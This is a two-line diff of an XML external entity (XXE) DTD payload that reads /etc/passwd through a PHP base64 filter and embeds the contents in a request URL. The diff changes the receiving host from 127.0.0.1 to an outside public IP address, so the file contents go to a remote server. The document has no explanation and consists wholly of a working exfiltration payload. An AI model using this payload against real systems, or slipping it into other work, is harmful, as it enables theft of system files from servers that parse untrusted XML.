@@ -1,2 +1,2 @@
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://62.84.186.132/dtd.xml?%data;'>">
